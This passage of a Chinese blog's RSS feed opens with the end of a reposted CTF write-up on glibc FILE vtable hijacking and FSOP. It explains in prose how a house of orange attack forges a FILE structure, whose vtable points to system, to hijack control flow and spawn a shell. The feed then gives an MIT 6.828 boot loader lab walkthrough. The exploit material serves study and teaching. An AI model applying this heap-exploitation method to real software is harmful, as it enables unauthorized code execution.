class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure><p>exit函数，栈回溯为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br><span class="line">main ()</span><br><span class="line">__libc_start_main (main=<span class="number">0x400566</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure><p>程序正常退出，栈回溯为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br><span class="line">__libc_start_main (main=<span class="number">0x400526</span> &lt;main&gt;, argc=<span class="number">0x1</span>, argv=<span class="number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe568</span>)</span><br><span class="line">_start ()</span><br></pre></td></tr></table></figure><p>看出来程序正常从main函数返回后，也是调用<code>exit</code>函数，所以最终才调用<code>_IO_flush_all_lockp</code>函数的。</p><p>再说如何利用，利用的方式为：伪造IO FILE结构体，并利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，或是将该链表中的一个节点（<code>_chain</code>字段）指向伪造的数据，最终触发<code>_IO_flush_all_lockp</code>，绕过检查，调用<code>_IO_OVERFLOW</code>时实现执行流劫持。</p><p>其中绕过检查的条件是输出缓冲区中存在数据：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br></pre></td></tr></table></figure><h2 id="示例–house-of-orange"><a href="#示例–house-of-orange" class="headerlink" title="示例–house of orange"></a>示例–house of orange</h2><p>FSOP的利用示例，最经典的莫过于<code>house of orange</code>攻击方法。下面将通过<code>house of orange</code>攻击方法具体体现vtable劫持和fsop，示例题是东华杯2016-pwn450的note。</p><p>先说明一下，程序中使用的<code>unsorted bin attack</code>改写<code>_IO_list_all</code>，使用<code>sysmalloc</code>得到<code>unsorted bin</code>的原理我不再详细描述，有需要的可以参考<a href="https://www.anquanke.com/post/id/85127">unsorted bin attack分析</a>，在这里主要集中在vtable的劫持以及FSOP的实现上。</p><p>题目是一道菜单题，可以创建、编辑、以及删除堆块，其中只允许同时对一个堆块进行操作，只有释放了当前堆块才可以申请下一个堆块。</p><p>在创建函数中，堆块被<code>malloc</code>出来后会打印堆的地址，可以使用该函数来泄露堆地址；漏洞在编辑函数中，编辑函数可以输入任意长的字符，因此可以造成堆溢出。</p><p>首先要解决如何实现地址泄露，正常来说通过创建函数可以得到堆地址，但是如何得到libc的地址？答案是可以通过申请大的堆块，申请堆块很大时，mmap出来的内存堆块会紧贴着libc，可通过偏移得到libc地址。从下图中可以看到，当申请堆块大小位0x200000时，申请出来的堆块紧贴libc，可通过堆块地址得到libc基址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13093036918/0" alt="20190627090106-0b3d81e0-9877-1"></p><p>如何得到unsorted bin？想要利用unsorted bin attack实现<code>_IO_list_all</code>的改写，那么就需要有unsorted bin才行，只有一个堆块，如何得到unsorted bin？答案是利用top chunk不足时堆的分配机制，当top chunk不足以分配，系统会分配新的top chunk并将旧的chunk使用free函数释放，此时会将堆块释放至unsorted bin中。我们可以利用覆盖，伪造top chunk的size，释放的堆块需满足下述条件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>即：</p><ol><li>size需要大于0x20（MINSIZE）</li><li>prev_inuse位为1</li><li>top chunk address + top chunk size 必须是页对齐的（页大小一般为0x1000）</li></ol><p>最终利用unsorted bin attack，将<code>_IO_list_all</code>指向<code>main_arena</code>中<code>unsorted_bins</code>数组的位置。</p><p>此时的<code>_IO_list_all</code>由于指向的是<code>main_arena</code>中的地址，并不是完全可控的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096333589/0" alt="20190627090131-1a0013d2-9877-1"></p><p>但是它的chain字段却是可控的，因为我们可以通过伪造一个大小为0x60的small bin释放到main_arena中，从而在unsorted bin attack后，该字段刚好被当作<code>_chain</code>字段，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096355394/0" alt="20190627090158-2a3ad4da-9877-1"></p><p>当调用<code>_IO_flush_all_lockp</code>时，<code>_IO_list_all</code>的头节点并不会使得我们可以控制执行流，但是当通过<code>fp = fp-&gt;_chain</code>链表，对第二个节点进行刷新缓冲区的时候，第二个节点的数据就是完全可控的。我们就可以伪造该结构体，构造好数据以及vtable，在调用vtable中的<code>_IO_OVERFLOW</code>函数时实现对控制流的劫持。</p><p>写exp时，可以利用<code>pwn_debug</code>中<code>IO_FILE_plus</code>模块中的<code>orange_check</code>函数来检查当前伪造的数据是否满足house of orange的攻击，以及使用<code>show</code>函数来显示当前伪造的FILE结构体。</p><p>伪造的IO FILE结构体如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096362098/0" alt="fake file"></p><p>可以看到<code>_mode</code>为0，<code>_IO_write_ptr</code>也大于<code>fp-&gt;_IO_write_base</code>因此会触发它的_<code>IO_OVERFLOW</code>函数，它的vtable被全部伪造成<code>system</code>的地址，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13096368155/0" alt="system"></p><p>最终执行system(“/bin/sh”)拿到shell。</p><p>vtable劫持和FSOP还是比较好理解的，下一篇将介绍vtable check机制和它的绕过方法。</p><p><a href="https://github.com/ray-cp/pwn_debug"><code>pwn_debug</code></a>新增了一个模块<code>IO_FILE_plus</code>，该模块可以很方便的查看和构造IO FILE结构体，以及检查结构体是否满足利用条件。本文中可以使用的api为<code>IO_FILE_plus.orange_check</code>，即检查当前构造的IO FILE是否满足house of orange的攻击条件。</p><p>exp和相关文件在我的<a href="https://github.com/ray-cp/ctf-pwn/tree/master/PWN_CATEGORY/IO_FILE/vtable_hajack/东华杯2016-pwn450_note">github</a>。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/26/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91IO%20FILE%E4%B9%8B%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab1-Exercise3</title>
      <link>https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/</link>
      <guid>https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/</guid>
      <pubDate>Sat, 23 Jan 2021 08:01:07 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Lab-1-Exercise-3：&quot;&gt;&lt;a href=&quot;#Lab-1-Exercise-3：&quot; class=&quot;headerlink&quot; title=&quot;Lab 1 Exercise 3：&quot;&gt;&lt;/a&gt;Lab 1 Exercise 3：&lt;/h2&gt;&lt;h3 id=&quot;任务&quot;&gt;&lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Lab-1-Exercise-3："><a href="#Lab-1-Exercise-3：" class="headerlink" title="Lab 1 Exercise 3："></a>Lab 1 Exercise 3：</h2><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>设置一个断点在地址0x7c00处，这是boot loader被加载的位置。然后让程序运行到这个直到这个断点。跟踪<code>boot/boot.S</code>文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件<code>obj/boot/boot.asm</code>。你也可以使用GDB的<code>x/i</code>指令来获取去任意一个机器指令的反汇编指令，把源文件boot.S文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p><p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出readsect() c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>下面我们分别分析一下Exercise中涉及的两个重要文件，它们一起组成了boot loader。分别是<code>/boot/boot.S</code>和<code>/boot/main.c</code>文件。其中前者是一个汇编文件，后者是一个C语言文件。当BIOS运行完成后，CPU的控制权就转移到boot.S文件上，首先我们看一下boot.S文件。</p><h4 id="boot-boot-S"><a href="#boot-boot-S" class="headerlink" title="/boot/boot.S"></a>/boot/boot.S</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 .globl start</span><br><span class="line">2 start:</span><br><span class="line">3   .code16                # Assemble for 16-bit mode</span><br><span class="line">4   cli                    # Disable interrupts</span><br></pre></td></tr></table></figure><p>​    这几条指令是boot.S最开始的几句，其中cli是boot.S，同时也是boot loader的第一条指令。这条指令用于把所有的中断都关闭。因为BIOS运行期间有可能打开了中断。此时CPU工作在实模式下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5  cld                         # String operations increment</span><br></pre></td></tr></table></figure><p>​    这条指令用于指定发生的串处理操作的指针移动方向。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6  # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">7  xorw    %ax,%ax             # Segment number zero</span><br><span class="line">8  movw    %ax,%ds             # -&gt; Data Segment</span><br><span class="line">9  movw    %ax,%es             # -&gt; Extra Segment</span><br><span class="line">10 movw    %ax,%ss             # -&gt; Stack Segment</span><br></pre></td></tr></table></figure><p>​    这几条命令主要是把三个段寄存器ds，es，ss全部清零，因为经历了BIOS，操作系统不能保证这三个寄存器中存放的是什么数，这也是为进入保护模式做准备。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11  # Enable A20:</span><br><span class="line">12  #   For backwards compatibility with the earliest PCs, physical</span><br><span class="line">13  #   address line 20 is tied low, so that addresses higher than</span><br><span class="line">14  #   1MB wrap around to zero by default.  This code undoes this.</span><br><span class="line">15 seta20.1:</span><br><span class="line">16  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">17  testb   $0x2,%al                # test &#x3D; AND</span><br><span class="line">18  jnz     seta20.1</span><br><span class="line"></span><br><span class="line">19  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</span><br><span class="line">20  outb    %al,$0x64</span><br><span class="line"></span><br><span class="line">21 seta20.2:</span><br><span class="line">22  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">23  testb   $0x2,%al</span><br><span class="line">24  jnz     seta20.2</span><br><span class="line"></span><br><span class="line">25  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</span><br><span class="line">26  outb    %al,$0x60</span><br></pre></td></tr></table></figure><p>​    这部分指令就是在准备把CPU的工作模式从实模式转换为保护模式。我们可以看到其中的inb，outb这样的IO端口命令。所以这些指令都是在对外部设备进行操作。从下面链接查询：</p><p>​    <a href="http://bochs.sourceforge.net/techspec/PORTS.LST">http://bochs.sourceforge.net/techspec/PORTS.LST</a></p><p>​    我们可以知道，0x64端口属于键盘控制器804x，名称是控制器读取状态寄存器。下面是各个位的含义</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13075840553/0" alt="image-20210123170158800"></p><p>​    所以16 ~ 18号指令是在不断的检测bit1。bit1的值代表了输入缓冲区是否满了，也就是说CPU传送给控制器的数据，控制器是否已经取走了，如果CPU想向控制器传送新的数据的话，必须先保证这一位为0。所以这三条指令会一直等待这一位变为0，才能继续向后运行。</p><p>​    当0x64端口准备好读入数据后，现在就可以写入数据了，所以19 ~ 20这两条指令是把0xd1这条数据写入到0x64端口中。当向0x64端口写入数据时，则代表向键盘控制器804x发送指令。这个指令将会被送给0x60端口。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077104980/0" alt="image-20210123221339018"></p><p>​    通过图中可见，D1指令代表下一次写入0x60端口的数据将被写入给804x控制器的输出端口。可以理解为下一个写入0x60端口的数据是一个控制指令。</p><p>​    然后21 ~ 24号指令又开始再次等待，等待刚刚写入的指令D1，是否已经被读取了。</p><p>​    如果指令被读取了，25 ~ 26号指令会向控制器输入新的指令，0xdf。通过查询我们可以看到0xdf指令的含义如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077116122/0" alt="image-20210123221731103"></p><p>​    指令的含义是使能A20线，代表可以进入保护模式了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">27   # Switch from real to protected mode, using a bootstrap GDT </span><br><span class="line">28   # and segment translation that makes virtual addresses  </span><br><span class="line">29   # identical to their physical addresses, so that the  </span><br><span class="line">30   # effective memory map does not change during the switch. </span><br><span class="line">31   lgdt    gdtdesc </span><br></pre></td></tr></table></figure><p>​    首先31号指令是把gdtdesc这个标识符的值送入全局映射描述符表寄存器GDTR中。这个GDT表是处理器工作于保护模式下一个非常重要的表。具体参照appendx文章中关于实模式和保护模式的介绍。至于这条指令的功能就是把关于GDT表的一些重要信息存放到CPU的GDTR寄存器中，其中包括GDT表的内存起始位置，以及GDT表的长度。这个寄存器由48位组成，其中低16位标识该表长度，高32位表示GDT表在内存中的起始地址。所以gdtdesc是一个标识符，标识着一个内存地址。从这个内存地址开始之后的6个字节中存放着GDT表的长度和起始地址。我们可以在文件末尾看到gdtdesc：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 # Bootstrap GDT</span><br><span class="line">2 .p2align 2                               # force 4 byte alignment</span><br><span class="line">3 gdt:</span><br><span class="line">4   SEG_NULL                               # null seg</span><br><span class="line">5   SEG(STA_X|STA_R, 0x0, 0xffffffff)      # code seg</span><br><span class="line">6   SEG(STA_W, 0x0, 0xffffffff)            # data seg</span><br><span class="line">7 </span><br><span class="line">8 gdtdesc:</span><br><span class="line">9   .word   0x17                           # sizeof(gdt) - 1</span><br><span class="line">10   .long   gdt                            # address gdt</span><br></pre></td></tr></table></figure><p>​    其中第三行的gdt是一个标识符，标识从这里开始就是GDT表了。可见这个GDT表中包括三个表项，分别代表三个段，null seg，code seg，data seg。由于xv6其实并没有使用分段基址，也就是说数据和代码都是写在一起的，所以数据段和代码段的起始地址都是0x0，大小都是0xffffffff=4GB。我们知道每个表项都是有三个字段的，那么这里第一个就是Flags字段，表示这个程序这个段的访问权限；中间的就是这个程序的这个段的起始地址；最后一个字段就是这个程序的这个段的大小。</p><p>​    在第4 ~ 6行是通过调用SEG()子程序来构造GDT表项的。这个子函数定义在mmu.h中，形式如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG(type,base,lim)                    \</span></span><br><span class="line">                  .word (((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>), ((base) &amp; <span class="number">0xffff</span>);    \</span><br><span class="line">                  .byte (((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), (<span class="number">0x90</span> | (type)),        \</span><br><span class="line">                  (<span class="number">0xC0</span> | (((lim) &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>)), (((base) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>​    可见函数需要三个参数，一个是type即这个段的访问权限，二是base，即这个段的起始地址，三是lim，即这个段的大小界限，每一个表项的结构如图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077181536/0" alt="image-20210123223910104"></p><p>​    然后gdtdesc处就要存放这个GDT表的信息了，其中0x17是这个表的大小-1 = 23，至于为什么，问就是不知道，是官方规定的，紧接着就是GDT表的起始地址gdt。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32   movl    %cr0, %eax</span><br><span class="line">33   orl     $CR0_PE_ON, %eax</span><br><span class="line">34   movl    %eax, %cr0</span><br></pre></td></tr></table></figure><p>​    接下来，当加载完GDT表的信息到GDTR寄存器之后。紧跟着3个操作，32 ~ 34指令。这几部操作明显是在修改CR0寄存器的内容。CR0寄存器还有CR1 ~ CR3寄存器都是80x86的控制寄存器。其中$CR0_PE_ON的开头定义了，值为0x1。可见上面的操作就是把CR0寄存器的0bit位置1，CR0寄存器的0bit是保护模式启动位，把这一位置1代表保护模式启动。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">35  ljmp    $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure><p>​    这只是一个简单的跳转指令，这条指令的目的在于把当前的运行模式切换为32位地址模式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protcseg:</span><br><span class="line">  # Set up the protected-mode data segment registers</span><br><span class="line">36  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector</span><br><span class="line">37  movw    %ax, %ds                # -&gt; DS: Data Segment</span><br><span class="line">38  movw    %ax, %es                # -&gt; ES: Extra Segment</span><br><span class="line">39  movw    %ax, %fs                # -&gt; FS</span><br><span class="line">40  movw    %ax, %gs                # -&gt; GS</span><br><span class="line">41  movw    %ax, %ss                # -&gt; SS: Stack Segment</span><br></pre></td></tr></table></figure><p>​    修改这些寄存器的值。这些寄存器都是段寄存器，如果刚加载完GDTR寄存器我们必须要重新加载所有的段寄存器的值，而其中CS段寄存器必须通过长跳转指令，即35号指令来进行加载。所有这些步骤是在第31号指令之后要做的，这样才能使GDTR的值生效。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Set up the stack pointer and call into C.</span><br><span class="line">42  movl    $start, %esp</span><br><span class="line">43  call bootmain</span><br></pre></td></tr></table></figure><p>​    接下来的指令就是要设置当前esp寄存器的值，然后准备正式跳转到main.c文件中的bootmain函数处。我们接下来分析一下这个函数的每一条指令。</p><h4 id="boot-main-c"><a href="#boot-main-c" class="headerlink" title="/boot/main.c"></a>/boot/main.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read 1st page off disk</span></span><br><span class="line"><span class="number">1</span> readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>​    这里首先调用了一个函数readseg，这个函数的定义为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readseg(<span class="keyword">uint32_t</span> pa, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span><br></pre></td></tr></table></figure><p>​    它的功能从注释上来理解应该是，把距离内核起始地址offset个偏移量存储单元作为起始，将它和它之后的count字节的数据读出送入以pa为起始地址的内存物理地址处。</p><p>​    所以这条指令是把内核的第一个页（4096字节）的内容读取到内存地址ELFHDR（0x10000）处。其实完成这些相当于把操作系统映像文件的elf文件头部读取出来放入内存中。</p><p>​    读取完这个内核的elf头部信息后，需要对这个elf头部信息进行验证，并且也需要通过它获取一些重要信息。这里大致了解下elf头部，详细可见 <a href="http://wiki.osdev.org/ELF。">http://wiki.osdev.org/ELF。</a></p><p>​    elf文件：elf是一种文件格式，主要被用来把程序存放到磁盘上。是在程序被编译和链接后被创建出来的。一个elf文件包括多个段。对于一个可执行程序，通常包含存放代码的文本段（text section），用于存放全局变量的data段，存放字符串常量的rodata段。elf文件的头部就是用来描述这个elf文件如何在存储器中存储。这里需要注意，可链接文件和可执行文件会有不同的elf头部格式。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)</span><br><span class="line"><span class="number">3</span>        <span class="keyword">goto</span> bad;</span><br></pre></td></tr></table></figure><p>​    elf头部信息的magic字段是整个头部信息的开端。并且如果这个文件的格式的ELF的话，文件的elf-&gt;magic域应该是等于ELF_MAGIC的，ELF_MAGIC定义在<code>/inc/elf.h</code>中，所以这条语句就是判断这个输入文件是否是合法的elf可执行文件。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> ph = (struct Proghdr *) ((<span class="keyword">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff);</span><br></pre></td></tr></table></figure><p>​    我们知道头部中一定包含Program Header Table。这个表格存放着程序中所有段的信息。通过这个表我们才能找到要执行的代码段，数据段等等。所以我们要先获得这个表。</p><p>​    这条指令就可以完成这一点，首先elf是表头起址，而phoff字段代表Program Header Table距离表头的偏移量。所以ph可以被指定为Program Header Table表头。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span> eph = ph + ELFHDR-&gt;e_phnum;</span><br></pre></td></tr></table></figure><p>​    由于phnum中存放的是Program Header Table表中表项的个数，即段的个数。所以这不操作是把eph指向该表末尾。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span> <span class="keyword">for</span> (; ph &lt; eph; ph++)</span><br><span class="line">    <span class="comment">// p_pa is the load address of this segment (as well</span></span><br><span class="line">    <span class="comment">// as the physical address)</span></span><br><span class="line"><span class="number">7</span>    readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br></pre></td></tr></table></figure><p>​    这个for循环就是在加载所有的段到内存中。ph-&gt;paddr是这个段在内存这种的物理地址。ph-&gt;off字段指的是这一个段的开头相对于elf文件的开头的偏移量。ph-&gt;filesz字段指的是这个段在elf文件中的大小。ph-&gt;memsz则指的是这个段实际被装入内存后的大小。通常来说memsz一定大于等于filesz，因为段在文件中时许多未定义的变量并没有分配空间给它们。</p><p>​    所以这个循环就是在把操作系统内核的各个段从外存读入内存中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span> ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) (ELFHDR-&gt;e_entry))();</span><br></pre></td></tr></table></figure><p>​    e_entry字段指向的是这个文件的执行入口地址。所以这里相当于开始运行这个文件。也就是内核文件。自此就把CPU的控制权从boot loader转交给了操作系统的内核。</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>下面我们来完成exercise让我们做的事。</p><p>首先是第一部分，对boot.S程序的跟踪，我们用gdb来操作。</p><p>打开gdb后我们输入<code>b *0x7c00</code>，然后输入c，表示继续运行到断点处。在这里我们输入 <code>x/30i 0x7c00</code>后显示如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13079377559/0" alt="image-20210124155519069"></p><p>这条gdb指令是把存放在0x7c00以及之后30字节的内存里面的指令反汇编出来，我们可以拿它直接和<code>boot.S</code>以及<code>obj/boot/boot.asm</code>进行比较</p><p>首先是obj/boot/boot.asm</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13080767453/0" alt="image-20210124222312820"></p><p>然后是boot.S</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13080771652/0" alt="image-20210124222418124"></p><p>可见这三者在指令上没有区别，只不过在源代码boot.S中，我们指定了很多标识符比如set20.1，.start，这些标识符在被汇编成机器代码后都会被转换成真实物理地址。比如set20.1就会被转换成0x7c0a，那么在obj/boot/boot.asm中还把这种关系列出来了，但是在真实执行时，即第一种情况时，就看不到set20.1标识符了，完全是真实物理地址。</p><p>紧接着是exercise是第二部分</p><p>对bootmain函数中的语句逐一分析，首先在boot.S中的最后一句是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 call boot main</span><br></pre></td></tr></table></figure><p>​    call指令将会把返回地址压入栈中，然后把bootmain的起始地址赋给%eip寄存器，这里这条语句执行后%eip的值变为0x7d15</p><p>​    从obj/boot/boot.asm文件中，正好可以看见bootmain函数的汇编形式：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13087940337/0" alt="image-20210126161838408"></p><p>​    可见bootmain翻译成汇编程序的第一条指令是<code>push %ebp</code>，地址为0x7d15。正好和%eip的值对上。另外%esp寄存器的值由0x7c00变成了0x7bfc（0x7c00-4）。其中栈顶此时存放的是boot.S运行时的返回地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088028986/0" alt="image-20210126163617801"></p><p>​    然后我们正式开始分析bootmain函数，上面的四句汇编代码是进行调用过程时，被调用过程必须要事先执行的一些通用的任务，如保存栈帧等。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 7d15:  55                    push   %ebp</span><br><span class="line">2 7d16:  89 e5                 mov    %esp,%ebp</span><br></pre></td></tr></table></figure><p>​    这两句就是在修改栈帧界限的信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3 7d18:  56                     push   %esi</span><br><span class="line">4 7d19:  53                     push   %ebx</span><br></pre></td></tr></table></figure><p>​    这两句操作就是在备份%esi，%ebx的值，因为这两个寄存器叫做被调用这保存寄存器，即如果要在子过程中使用它们，那么在子过程开头必须先备份这些寄存器的值。</p><p>​    那么此时%esp的值为0x7bf0，而%ebp的值设置为0x7bf8。可见进入bootmain函数后，把0x7c00之前的低地址空间拿来作为栈帧使用。</p><p>然后我们接着看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read 1st page off disk</span></span><br><span class="line"><span class="number">1</span> readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088078725/0" alt="image-20210126164600317"></p><p>​    <strong>首先0x7d1a ~ 0x7d21这三条指令的目的是为了把三个输入参数压入栈帧之中（32位入参顺序为从右到左），以供readseg子过程调用，%esp寄存器的值也随之改变为0x7be4。此时0x7d26执行，调用readseg子过程，该子过程的第一条指令地址为0x7cdc。</strong>调用call时，会把bootmain下一个要执行的指令地址0x7d2b，也就是返回地址压入栈顶0x7be0中。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088123645/0" alt="image-20210126165312487"></p><p>​    然后就是进入readseg函数，开头依旧是保存栈帧和要使用的寄存器</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088138256/0" alt="image-20210126165531013"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov 0x10(%ebp), %edi</span><br></pre></td></tr></table></figure><p>这条指令是要取出第三个输入参数即0，到%edi寄存器中。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088177150/0" alt="image-20210126170200479"></p><p>​    接下来的语句如上，0xc(%ebp)是第二个参数，0x8(%ebp)是第一个参数。那么到这里就是第三个参数放入了%edi，第二个参数放入了%esi，第一个参数放入了%ebx。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shr $0x9 %edi</span><br></pre></td></tr></table></figure><p>  <strong>由于shr是汇编逻辑右移指令，而%edi中存放的是第3个参数值，offset，将这个offset逻辑右移9位正好等于把offset的除以512即SECTSIZE，所以就是在完成</strong></p><p>  <strong>offset = (offset / SECTSIZE) + 1指令的其中一部分。这条c语言指令的功能是计算要读取这段区域的第一个扇区的扇区号。</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add  %ebx, %esi</span><br></pre></td></tr></table></figure><p>　 <strong>由于%ebx中存放的是第1个参数pa，%esi中存放的是第2个参数0x1000(即4096)，那么这条指令完成的就是C语言语句：</strong></p><p>　  <strong>end_pa = pa + count;</strong></p><p>   这句指令是让end_pa指向要被读取到内存的这块数据所存放的最后一个位置的地址。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inc %edi</span><br></pre></td></tr></table></figure><p>　这条语句很好理解就是在完成C语言语句 <strong>offset = (offset / SECTSIZE) + 1</strong>中的加1的部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and $0xfffffe00, %ebx</span><br></pre></td></tr></table></figure><p>　这条语句完成的是C语言语句： <strong>pa &amp;= ~(SECTSIZE-1)</strong> </p><p>　功能就是把pa重新定向到offset存储单元所在的扇区的起始地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088322100/0" alt="image-20210126172332302"></p><p>​    此时开始进入while循环，即开始把外存中的数据传输到内核。这里判断%ebx和%esi的值的大小，其中%ebx存放的就是指针pa，而%esi存放的是指针end_pa。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088353033/0" alt="image-20210126172805812"></p><p>​    